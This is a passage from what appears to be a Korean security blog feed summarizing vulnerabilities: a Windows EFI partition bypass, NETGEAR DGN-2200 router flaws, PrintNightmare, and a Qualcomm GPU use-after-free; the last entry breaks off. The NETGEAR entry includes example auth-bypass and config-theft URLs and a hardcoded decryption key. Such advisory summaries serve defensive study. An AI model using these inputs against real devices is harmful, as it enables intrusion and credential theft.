&#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xAE30; &#xC704;&#xD574;&#xC120; &#xB610; &#xB2E4;&#xB978; PE exploit&#xC744; &#xC694;&#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xD76C;&#xB294; WinAFL&#xC744; &#xC0AC;&#xB791;&#xD558;&#xACE0; &#xB354; &#xB9CE;&#xC774; &#xC4F0;&#xC774;&#xAE38; &#xBC14;&#xB77C;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>WinAFL&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74;&#xC11C; &#xBC84;&#xADF8;&#xB098; &#xAE30;&#xB2A5; &#xB204;&#xB77D; &#xB4F1;&#xC744; &#xC790;&#xC8FC; &#xB9C8;&#xC8FC;&#xCCE4;&#xC2B5;&#xB2C8;&#xB2E4;. Windows 10 Appifier&#xC5D0; &#xB300;&#xD55C; &#xC9C0;&#xC6D0; &#xCD94;&#xAC00;, CPU &#xC120;&#xD638;&#xB3C4;, &#xBC84;&#xADF8; &#xC218;&#xC815; &#xBC0F; &#xBA87; &#xAC00;&#xC9C0; GUI &#xAE30;&#xB2A5;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xACE0; &#xC5C5;&#xC2A4;&#xD2B8;&#xB9BC; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xD76C; &#xCEE4;&#xBC0B; &#xB9C1;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Netanel&#x2019;s commits &#x2013; <a href="https://github.com/googleprojectzero/winafl/commits?author=netanel01">https://github.com/googleprojectzero/winafl/commits?author=netanel01</a></p><p>Yoava&#x2019;s commits &#x2013; <a href="https://github.com/googleprojectzero/winafl/commits?author=yoava333">https://github.com/googleprojectzero/winafl/commits?author=yoava333</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>fuzzing</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>winafl</tag>
      
      <tag>harness</tag>
      
      <tag>bug bounty</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26892: AN AUTHORIZATION BYPASS ON THE MICROSOFT WINDOWS EFI SYSTEM PARTITION</title>
    <link href="/2021/07/03/fabu1ous/2021-07-02/"/>
    <url>/2021/07/03/fabu1ous/2021-07-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/30/cve-2021-26892-an-authorization-bypass-on-the-microsoft-windows-efi-system-partition">AN AUTHORIZATION BYPASS ON THE MICROSOFT WINDOWS EFI SYSTEM PARTITION</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows Extensible Firmware Interface</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Extensible Firmware Interface&#xC758; &#xBCF4;&#xC548; &#xAE30;&#xB2A5;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xBC1C;&#xACAC;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. UEFI&#xB294; BIOS&#xB97C; &#xB300;&#xCCB4;&#xD558;&#xB294; &#xD38C;&#xC6E8;&#xC5B4; &#xADDC;&#xACA9;&#xC73C;&#xB85C; &#xBD80;&#xD305; &#xC2DC; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xAC00; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xCCAB; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. UEFI&#xB294; EFI System Partiton(&#xC774;&#xD558; ESP)&#xB97C; &#xD3EC;&#xD568;&#xD55C; boot device&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. ESP&#xB294; FAT &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xD3EC;&#xB9F7;&#xC744; &#xB530;&#xB974;&#xBA70; OS&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD38C;&#xC6E8;&#xC5B4;&#xAC00; &#xD30C;&#xC2F1;&#xD558;&#xB294; <code>.EFI</code>&#xD30C;&#xC77C;(&#xBD80;&#xD2B8;&#xB85C;&#xB354;&#xB77C;&#xACE0;&#xB3C4; &#xBD88;&#xB9BC;)&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. FAT &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC740; ACL&#xC774;&#xB098; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC744; &#xD30C;&#xC77C;&#xC5D0; &#xAE30;&#xB85D;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Windows&#xC5D0; &#xB9C8;&#xC6B4;&#xD2B8; &#xB418;&#xBA74; &#xB204;&#xAD6C;&#xB098; &#xADF8; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC5D0; &#xC77D;&#xAE30; &#xB610;&#xB294; &#xC4F0;&#xAE30; &#xC791;&#xC5C5;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBD80;&#xD305;&#xC5D0; &#xD544;&#xC694;&#xD55C; critical &#xD30C;&#xC77C;&#xC744; &#xB204;&#xAD6C;&#xB098; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xB2F4;&#xC740; bootkit&#xC73C;&#xB85C; &#xB300;&#xCCB4;&#xB418;&#xB294; &#xB4F1;&#xC758; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; Windows&#xB294; &#xBD80;&#xD305;&#xC774; &#xC644;&#xB8CC;&#xB41C; &#xC774;&#xD6C4;&#xC5D0; ESP&#xAC00; &#xB9C8;&#xC6B4;&#xD2B8; &#xB418;&#xB294; &#xAC83;&#xC744; &#xC81C;&#xD55C;&#xD558;&#xACE0;, &#xB9CC;&#xC57D; &#xB9C8;&#xC6B4;&#xD2B8; &#xB410;&#xB2E4; &#xD558;&#xB354;&#xB77C;&#xB3C4; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB2E4;&#xBA74; &#xD574;&#xB2F9; &#xBCFC;&#xB968;&#xC5D0; &#xC5B4;&#xB5A0;&#xD55C; &#xC791;&#xC5C5;&#xB3C4; &#xD5C8;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; <code>CreateFile</code> API&#xC640; ESP &#xBCFC;&#xB968; &#xC774;&#xB984;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xB97C; &#xD1B5;&#xD574; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C; &#xC5C6;&#xC774; ESP &#xB0B4;&#xBD80;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC784;&#xC758;&#xC758; <code>.EFI</code> &#xD30C;&#xC77C; &#xD578;&#xB4E4;&#xC744; &#xC5BB;&#xC5B4; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xBC31;&#xC9C0;&#xD654;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD574; <code>dwDesiredAccess</code> &#xAC12;&#xC774; &#xC5C6;&#xACE0; <code>dwCreateDisposition</code> &#xC5D0; <code>CREATE_ALWAYS</code>  &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; <code>CreateFile</code> &#xC694;&#xCCAD;&#xC740; &#xB300;&#xC0C1; &#xD30C;&#xC77C;&#xC758; &#xD06C;&#xAE30;&#xB97C; 0&#xC73C;&#xB85C; &#xCD95;&#xC18C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB77C;&#xB3C4; critical&#xD55C; <code>.EFI</code> &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC9C0;&#xC6CC;&#xBC84;&#xB9B4; &#xC218; &#xC788;&#xACE0; &#xD574;&#xB2F9; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xBD80;&#xD305;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">HANDLE <span class="hljs-title">CreateFileA</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  LPCSTR                lpFileName,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwDesiredAccess,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwShareMode,</span></span><span class="hljs-function"><span class="hljs-params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwCreationDisposition,</span></span><span class="hljs-function"><span class="hljs-params">  DWORD                 dwFlagsAndAttributes,</span></span><span class="hljs-function"><span class="hljs-params">  HANDLE                hTemplateFile</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>auth bypass</tag>
      
      <tag>efi</tag>
      
      <tag>boot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] NETGEAR firmware 취약점</title>
    <link href="/2021/07/02/idioth/2021-07-02/"/>
    <url>/2021/07/02/idioth/2021-07-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/">Microsoft finds new NETGEAR firmware vulnerabilities that could lead to identity theft and full system compromise</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NETGEAR DGN-2200v1 &#xC2DC;&#xB9AC;&#xC988;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xC5D0;&#xC11C; NETGEAR DGN-2200v1 &#xC2DC;&#xB9AC;&#xC988; &#xB77C;&#xC6B0;&#xD130;&#xC5D0;&#xC11C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xBCF4;&#xC548;&#xC744; &#xC190;&#xC0C1;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xB294; &#xC138; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC778;&#xC99D; &#xC6B0;&#xD68C;&#xB97C; &#xD1B5;&#xD55C; &#xB77C;&#xC6B0;&#xD130; &#xAD00;&#xB9AC;&#xC790; &#xD398;&#xC774;&#xC9C0; &#xC811;&#xADFC;</strong></p><p>HTTPd &#xB0B4;&#xBD80; &#xCC98;&#xB9AC; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>strstr</code>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC804;&#xCCB4; &#xBB38;&#xC790;&#xC5F4;&#xC5D0;&#xC11C; <code>.jpg</code>, <code>.gif</code>, <code>ess_</code> &#xB4F1;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; GET &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD55C; &#xD398;&#xC774;&#xC9C0; &#xB4A4;&#xC5D0; &#xD574;&#xB2F9; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xAC78;&#xB9B0; &#xBB38;&#xC790;&#xB97C; &#xB123;&#xC73C;&#xBA74; &#xC778;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs asciidoc">&#xC608;&#xC2DC;) <span class="hljs-link">http://127</span>[<span class="hljs-string">.</span>]<span class="hljs-link">0[.]0</span>[<span class="hljs-string">.</span>]<span class="hljs-link">1/admin.htm?pic.gif</span></code></pre><p><strong>Cryptographic side-channel&#xC744; &#xD1B5;&#xD574; &#xC800;&#xC7A5;&#xB41C; &#xB77C;&#xC6B0;&#xD130; &#xC790;&#xACA9; &#xC99D;&#xBA85; &#xAC00;&#xC838;&#xC624;&#xAE30;</strong></p><p>&#xB77C;&#xC6B0;&#xD130;&#xC5D0;&#xC11C; HTTPd &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC778;&#xC99D;&#xD574;&#xC57C;&#xD558;&#xB294; &#xACBD;&#xC6B0; HTTP basic authentication&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984;&#xACFC; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB294; base64&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB418;&#xACE0; HTTP &#xD5E4;&#xB354;&#xB85C; &#xC804;&#xC1A1;&#xB41C; &#xD6C4; &#xB77C;&#xC6B0;&#xD130;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC774;&#xB984;&#xACFC; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xC640; &#xBE44;&#xAD50;&#xD574; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB77C;&#xC6B0;&#xD130;&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xC678;&#xBD80;&#xC5D0; &#xC788;&#xB294; NVRAM&#xC5D0; &#xC778;&#xC99D; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xBBC0;&#xB85C; &#xC774;&#xB97C; &#xCD94;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC778;&#xC99D; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xC774;&#xB984;&#xACFC; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; <code>strcmp</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;. <code>strcmp</code>&#xB294; NUL&#xC744; &#xB9CC;&#xB098;&#xAC70;&#xB098; &#xC77C;&#xCE58;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC0DD;&#xAE38; &#xB54C;&#xAE4C;&#xC9C0; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xBBC0;&#xB85C; &#xC2E4;&#xD328;&#xD560; &#xB54C;&#xAE4C;&#xC9C0; &#xAC78;&#xB9AC;&#xB294; &#xC2DC;&#xAC04;&#xC744; &#xD1B5;&#xD574; side-channel attack&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC800;&#xC7A5;&#xB41C; &#xBBFC;&#xAC10;&#xD55C; &#xC815;&#xBCF4; &#xD0D0;&#xC0C9;</strong></p><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xB4DC;&#xB9B0; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD55C; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAC83; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xB77C;&#xC6B0;&#xD130;&#xC758; &#xC124;&#xC815; &#xBC31;&#xC5C5;/&#xBCF5;&#xAD6C; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xC790; &#xC774;&#xB984;, &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>http://router_addr:8080/NETGEAR_DGN2200[.]cfg?pic[.]gif</code>&#xB85C; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC740; DES&#xB85C; &#xC554;&#xD638;&#xD654; &#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBA70;, &#xBC31;&#xC5C5;/&#xBCF5;&#xAD6C; &#xAE30;&#xB2A5;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>NtgrBak</code> &#xD0A4;&#xB97C; &#xD1B5;&#xD574; &#xC554;&#xD638;&#xD654; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xB294; NVRAM&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC554;&#xD638;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>microsoft</tag>
      
      <tag>side-channel attack</tag>
      
      <tag>authentication bypass</tag>
      
      <tag>idioth</tag>
      
      <tag>netgear</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1675: Windows Spooler Service 원격 코드 실행 취약점</title>
    <link href="/2021/07/01/l0ch/2021-07-01/"/>
    <url>/2021/07/01/l0ch/2021-07-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/afwu/PrintNightmare">PrintNightmare (CVE-2021-1675): Remote code execution in Windows Spooler Service</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PrintNightmare&#xB77C;&#xB294; &#xC774;&#xB984;&#xC758; Printer Spooler &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4; &#xBC0F; PoC&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD504;&#xB9B0;&#xD130; &#xC11C;&#xBC84;&#xC5D0; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xAC70;&#xB098; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. <code>RpcAddPrinterDriver</code> &#xD568;&#xC218;&#xB294; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xCD94;&#xAC00;&#xD560; &#xB54C; Spooler Service&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">1</span>:<span class="hljs-function">__int64 __fastcall <span class="hljs-title">SplAddPrinterDriverEx</span><span class="hljs-params">(.. <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a4 ..)</span></span>{<span class="hljs-number">2</span>:...<span class="hljs-number">3</span>:<span class="hljs-number">4</span>:<span class="hljs-keyword">if</span>( !_bittest((<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> *)&amp;a4, <span class="hljs-number">0xF</span>u))<span class="hljs-number">5</span>:v11 = a7;<span class="hljs-number">6</span>:<span class="hljs-keyword">if</span>(v11 &amp;&amp; !(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)ValidateObjectAccess(<span class="hljs-number">0</span>i64, <span class="hljs-number">1</span>i64, <span class="hljs-number">0</span>i64)<span class="hljs-number">7</span>:<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<span class="hljs-number">8</span>:<span class="hljs-keyword">return</span> InternalAddPrinterDriverEx(lpString1, a2, a3, a4, (struct _INISPOOLER *)a5, a6, v11, <span class="hljs-number">0</span>i64);<span class="hljs-number">9</span>:<span class="hljs-number">10</span>:}</code></pre><p>line 4&#xC640; 5&#xC5D0;&#xC11C; <code>a4</code>&#xB294; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC758; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xAC80;&#xC0AC;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xC545;&#xC131; DLL&#xC744; &#xD0C0;&#xAC9F; &#xC11C;&#xBC84;&#xC5D0; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC815;&#xBCF4; &#xAD6C;&#xC870;&#xCCB4;&#xC758; <code>pConfigFile</code>&#xC774; UNC &#xACBD;&#xB85C;&#xAC00; &#xD5C8;&#xC6A9;&#xB41C;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xD0C0;&#xAC9F; &#xC11C;&#xBC84;&#xC5D0; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC5C5;&#xADF8;&#xB808;&#xC774;&#xB4DC;&#xC758; &#xBC31;&#xC5C5; &#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xC561;&#xC138;&#xC2A4; &#xCDA9;&#xB3CC;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xB85C;&#xB4DC;&#xB41C; &#xC545;&#xC131; dll&#xC744; spooler service&#xC5D0; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>UNC(Universal Naming Convention) : &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC0C1;&#xC758; &#xACF5;&#xC720; &#xD30C;&#xC77C; &#xACBD;&#xB85C; &#xD3EC;&#xB9F7; ex) \servername\sharename\path\filename</p></blockquote><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; Microsoft&#xB294; 2021&#xB144; 6&#xC6D4; 8&#xC77C; Patch Tuesday &#xB9B4;&#xB9AC;&#xC988;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xD588;&#xC9C0;&#xB9CC; &#xD328;&#xCE58;&#xAC00; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD574;&#xACB0;&#xD558;&#xC9C0; &#xBABB;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0">https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>microsoft</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>printer spooler</tag>
      
      <tag>printnightmare</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1905: Qualcomm Adreno GPU memory mapping use-after-free</title>
    <link href="/2021/06/30/fabu1ous/2021-06-30/"/>
    <url>/2021/06/30/fabu1ous/2021-06-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1905.html">CVE-2021-1905: Qualcomm Adreno GPU memory mapping use-after-free</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Qualcomm Adreno GPU</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Qualcomm Adreno GPU&#xB294; &#xC5EC;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xB9E4;&#xD551;&#xC744; &#xB3D9;&#xC2F1;&#xC5D0; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Use-after-free &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. GPU&#xB294; &#xC5EC;&#xB7EC; VMA(Linux Virtual Memory Access)&#xC640; &#xBA54;&#xBAA8;&#xB9AC; &#xB9E4;&#xD551;&#xC744; &#xACF5;&#xC720;&#xD558;&#xACE0; &#xD558;&#xB098;&#xC758; &#xB9E4;&#xD551;&#xC774; &#xB2EB;&#xD788;&#xBA74; <code>kpsl_gpumem_vm_close</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; <code>entry-&gt;memdesc.useraddr</code> &#xD544;&#xB4DC;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; &#xD574;&#xB2F9; &#xD544;&#xB4DC;&#xAC00; &#xC5EC;&#xB7EC; VMA&#xC5D0; &#xACF5;&#xC720;&#xB418;&#xBA70; entry&#xAC00; &#xC774;&#xBBF8; &#xB9E4;&#xD551;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xBBC0;&#xB85C; &#xB098;&#xBA38;&#xC9C0; VMA&#xC5D0; &#xC758;&#xB3C4;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. Linux kernel mmap implementation&#xC5D0; &#xB530;&#xB77C; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xB3D9;&#xC2DC;&#xC5D0; &#xD638;&#xCD9C;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xD568;&#xC218; <code>kpsl_get_unmapped_area</code>&#xB97C; &#xB450; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xAC19;&#xC740; GPU 